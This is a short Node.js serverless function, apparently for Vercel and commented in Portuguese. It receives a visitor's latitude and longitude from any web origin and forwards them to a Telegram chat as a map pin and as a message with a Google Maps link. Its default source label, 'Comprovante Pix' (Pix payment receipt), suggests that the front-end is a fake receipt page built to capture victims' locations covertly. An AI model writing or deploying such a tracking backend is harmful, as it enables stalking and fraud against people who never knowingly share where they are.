const axios = require("axios");

module.exports = async (req, res) => {
  // Permitir requisições do front-end (CORS)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "Método não permitido" });
  }

  const { latitude, longitude, source, maps } = req.body;

  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return res.status(500).json({ success: false, message: "Tokens do Telegram não configurados na Vercel." });
  }

  if (!latitude || !longitude) {
    return res.status(400).json({ success: false, message: "Latitude e longitude obrigatórias." });
  }

  try {
    const formattedLatitude = parseFloat(latitude.toFixed(6));
    const formattedLongitude = parseFloat(longitude.toFixed(6));

    // 1. Envia a localização exata (mapa interativo) para o Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
      chat_id: TELEGRAM_CHAT_ID,
      latitude: formattedLatitude,
      longitude: formattedLongitude
    });

    // 2. Envia a mensagem de texto com os detalhes
    const message = `📍 Localização recebida\nFonte: ${source || 'Comprovante Pix'}\nMaps: https://www.google.com/maps?q=${formattedLatitude},${formattedLongitude}\nLatitude: ${formattedLatitude}\nLongitude: ${formattedLongitude}`;

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    });

    return res.status(200).json({ success: true, message: "Enviado com sucesso!" });

  } catch (error) {
    console.error("Erro ao enviar para o Telegram:", error.response?.data || error.message);
    return res.status(500).json({ success: false, message: "Erro ao enviar para o Telegram." });
  }
};
